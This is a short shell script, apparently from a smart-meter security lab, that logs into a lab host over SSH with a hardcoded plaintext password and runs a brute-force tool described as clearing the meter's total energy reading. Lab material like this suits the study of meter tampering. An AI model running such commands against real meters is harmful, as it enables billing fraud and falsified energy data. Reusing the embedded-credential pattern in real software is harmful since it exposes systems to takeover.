#!/bin/sh

# Description: This file/script demostrates the clearing of total energy reading within the smart meter 
# Tag: Clear reading  
sshpass -p 'Student12345@' ssh student@172.16.2.223 -o ConnectTimeout=5 "cd \"C:\Windows\Temp\SmartMetertest\" && BruteForce.exe"
